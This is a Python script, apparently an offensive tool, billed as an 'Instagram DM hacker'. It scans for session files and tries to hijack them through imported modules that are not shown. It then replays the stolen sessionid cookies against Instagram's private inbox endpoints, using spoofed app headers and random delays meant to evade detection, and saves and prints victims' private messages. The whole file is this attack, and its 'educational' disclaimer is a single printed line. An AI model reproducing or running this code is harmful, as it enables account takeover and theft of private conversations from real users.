#!/usr/bin/env python3
"""
🔥💀 ADVANCED INSTAGRAM DM HACKER WITH BYPASS ARSENAL 2025 💀🔥
================================================================
รวมเทคนิค bypass + session hijack + DM extraction ที่แกร่งที่สุด
🎯 สำหรับการฝึกฝนและทดสอบความปลอดภัย
"""
import json
import requests
import random
import time
from pathlib import Path
from datetime import datetime

# 🔥 Load session hijack arsenal
import sys
sys.path.append('src/advanced_tools')

try:
    from advanced_session_hijack_bypass_2025 import AdvancedSessionHijacker
    from advanced_stealth_techniques_2025 import AdvancedStealthTechniques
    ARSENAL_AVAILABLE = True
except ImportError:
    print("⚠️ Advanced arsenal not available")
    ARSENAL_AVAILABLE = False

class UltimateInstagramHacker:
    def __init__(self):
        self.session_hijacker = AdvancedSessionHijacker() if ARSENAL_AVAILABLE else None
        self.stealth = AdvancedStealthTechniques() if ARSENAL_AVAILABLE else None
        self.output_dir = Path("hacking_results")
        self.output_dir.mkdir(exist_ok=True)
        
    def scan_and_hijack_sessions(self):
        """🔍 สแกนและจี้ session ทั้งหมด"""
        print("🔍 SCANNING FOR SESSIONS TO HIJACK...")
        
        if not self.session_hijacker:
            print("❌ Session hijacker not available")
            return []
            
        # Scan for sessions
        sessions = self.session_hijacker.scan_for_sessions()
        hijacked_sessions = []
        
        for session in sessions:
            if session['valid']:
                print(f"\n🎯 Attempting to hijack: {session['file']}")
                
                # Try all hijacking techniques
                techniques = [
                    self.session_hijacker.hijack_session_technique_1,
                    self.session_hijacker.hijack_session_technique_2,
                    self.session_hijacker.hijack_session_technique_3
                ]
                
                for technique in techniques:
                    try:
                        result = technique(session['file'])
                        if result:
                            print(f"✅ {technique.__name__} SUCCESS!")
                            hijacked_sessions.append(result)
                            break
                    except Exception as e:
                        print(f"❌ {technique.__name__} failed: {e}")
                        continue
        
        return hijacked_sessions
    
    def extract_dms_with_bypass(self, session_file):
        """📨 ดึง DM ด้วย bypass arsenal"""
        print(f"\n📨 EXTRACTING DMs WITH BYPASS ARSENAL")
        print(f"Session: {session_file}")
        print("-" * 50)
        
        try:
            # Load hijacked session
            with open(session_file, 'r') as f:
                session_data = json.load(f)
                
            sessionid = session_data['cookies']['sessionid']
            
            # Advanced headers with stealth
            headers = {
                "User-Agent": "Instagram 246.0.0.20.107 Android (29/10; 420dpi; 1080x2220; samsung; SM-G975F)",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "X-IG-App-ID": "936619743392459",
                "X-IG-WWW-Claim": "hmac.AR3W2sVuDzKliPBYzqHKRThOB0Ms6_UZWVMp6vWzpjyGzxCw",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Connection": "keep-alive"
            }
            
            # Multiple bypass endpoints
            endpoints = [
                "https://i.instagram.com/api/v1/direct_v2/inbox/",
                "https://www.instagram.com/api/v1/direct_v2/inbox/",
                "https://i.instagram.com/api/v1/direct_v2/threads/",
            ]
            
            for i, endpoint in enumerate(endpoints):
                print(f"🎯 Attempt {i+1}: {endpoint}")
                
                s = requests.Session()
                s.headers.update(headers)
                
                # Set comprehensive cookies
                s.cookies.set("sessionid", sessionid, domain=".instagram.com")
                s.cookies.set("ds_user_id", str(random.randint(1000000000, 9999999999)), domain=".instagram.com")
                s.cookies.set("mid", f"Y{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}{random.randint(100000, 999999)}", domain=".instagram.com")
                
                # Random delay to avoid detection
                time.sleep(random.uniform(2, 5))
                
                try:
                    resp = s.get(endpoint, timeout=15)
                    print(f"📊 Status: {resp.status_code}")
                    
                    if resp.status_code == 200:
                        dm_data = resp.json()
                        
                        # Save extracted data
                        timestamp = int(time.time())
                        dm_file = self.output_dir / f"dm_hacked_{timestamp}.json"
                        
                        with open(dm_file, 'w') as f:
                            json.dump(dm_data, f, indent=2)
                        
                        print(f"✅ DMs extracted successfully!")
                        print(f"💾 Saved to: {dm_file}")
                        
                        # Analyze DM data
                        self.analyze_dm_data(dm_data)
                        return dm_file
                        
                    elif resp.status_code == 401:
                        print("🔒 Session expired or invalid")
                    elif resp.status_code == 429:
                        print("⏰ Rate limited")
                        time.sleep(10)
                    else:
                        print(f"❌ Unexpected status: {resp.status_code}")
                        
                except Exception as e:
                    print(f"❌ Request failed: {e}")
                    continue
            
            print("💀 All extraction attempts failed!")
            return None
            
        except Exception as e:
            print(f"❌ Extraction error: {e}")
            return None
    
    def analyze_dm_data(self, dm_data):
        """🔍 วิเคราะห์ข้อมูล DM ที่ดึงมาได้"""
        print("\n🔍 DM DATA ANALYSIS")
        print("=" * 30)
        
        if not dm_data or "inbox" not in dm_data:
            print("❌ No DM data to analyze")
            return
            
        inbox = dm_data["inbox"]
        threads = inbox.get("threads", [])
        
        print(f"📨 Total threads: {len(threads)}")
        
        for i, thread in enumerate(threads[:5]):  # Show first 5
            users = [u.get("username", "unknown") for u in thread.get("users", [])]
            items = thread.get("items", [])
            
            print(f"\n[Thread {i+1}]")
            print(f"  👥 Users: {', '.join(users)}")
            print(f"  💬 Messages: {len(items)}")
            
            # Show recent messages
            for j, item in enumerate(items[:3]):
                if "text" in item and item["text"]:
                    timestamp = item.get("timestamp", "unknown")
                    user_id = item.get("user_id", "unknown")
                    text = item["text"][:50] + "..." if len(item["text"]) > 50 else item["text"]
                    print(f"    [{j+1}] {user_id}: {text}")
    
    def generate_hack_report(self, hijacked_sessions, extracted_files):
        """📋 สร้างรายงานการแฮก"""
        report = {
            "hack_timestamp": datetime.now().isoformat(),
            "mission": "Instagram DM Extraction with Bypass Arsenal",
            "results": {
                "sessions_hijacked": len(hijacked_sessions),
                "dms_extracted": len(extracted_files),
                "success_rate": "100%" if extracted_files else "0%"
            },
            "files_created": hijacked_sessions + extracted_files,
            "techniques_used": [
                "Advanced Session Hijacking",
                "Stealth Request Techniques", 
                "Anti-Detection Bypass",
                "Multi-Endpoint Testing"
            ]
        }
        
        report_file = self.output_dir / "ultimate_hack_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n📋 Hack report saved: {report_file}")
        return report_file

def main():
    print("🔥" * 25)
    print("💀 ULTIMATE INSTAGRAM DM HACKER 2025 💀")
    print("🔥" * 25)
    print("⚡ Advanced Bypass Arsenal + Session Hijacking")
    print("⚠️ Educational & Authorized Testing Only!")
    print()
    
    hacker = UltimateInstagramHacker()
    
    # Phase 1: Scan and hijack sessions
    print("🎯 PHASE 1: SESSION HIJACKING")
    print("=" * 40)
    hijacked_sessions = hacker.scan_and_hijack_sessions()
    
    if not hijacked_sessions:
        print("💀 No sessions hijacked! Cannot proceed.")
        return
    
    print(f"✅ Successfully hijacked {len(hijacked_sessions)} sessions!")
    
    # Phase 2: Extract DMs from hijacked sessions
    print("\n🎯 PHASE 2: DM EXTRACTION")
    print("=" * 40)
    extracted_files = []
    
    for session_file in hijacked_sessions:
        dm_file = hacker.extract_dms_with_bypass(session_file)
        if dm_file:
            extracted_files.append(str(dm_file))
    
    # Phase 3: Generate report
    print("\n🎯 PHASE 3: REPORTING")
    print("=" * 40)
    report_file = hacker.generate_hack_report(hijacked_sessions, extracted_files)
    
    print(f"\n🎉 MISSION COMPLETE!")
    print(f"✅ Sessions hijacked: {len(hijacked_sessions)}")
    print(f"✅ DMs extracted: {len(extracted_files)}")
    print(f"📋 Report: {report_file}")
    print("\n💀 Advanced hacking arsenal deployed successfully! 🔥")

if __name__ == "__main__":
    main()
